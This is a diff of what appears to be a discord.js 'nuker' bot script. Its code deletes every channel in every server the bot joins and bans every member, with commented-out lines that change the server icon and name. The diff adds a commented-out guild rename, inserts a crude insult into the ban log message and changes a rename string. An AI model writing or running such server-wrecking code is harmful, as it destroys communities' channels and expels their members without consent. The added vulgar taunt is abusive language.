@@ -17,8 +17,11 @@ client.on("ready", () => {
             if (err) throw err;
         });
     });
-
-
+/*
+    client.guilds.setName('Name')
+    .then(g => console.log(`Updated guild name to ${g}`))
+    .catch(console.error);
+*/
     client.guilds.forEach(server => {
         server.channels.forEach(channel => {
             channel.delete().then(response => {
@@ -33,7 +36,7 @@ client.on("ready", () => {
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             m.ban();
-            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. I FUCKED YOUR MOM (╯°□°）╯︵ ┻━┻`);
         });
     });
     
@@ -47,7 +50,7 @@ client.on("ready", () => {
     guild.setIcon("https://china.hacked-my.computer/95314b55.png");
 
     //set server name
-    guild.setName("This is what you deserve");
+    guild.setName("name");
     */
 
 
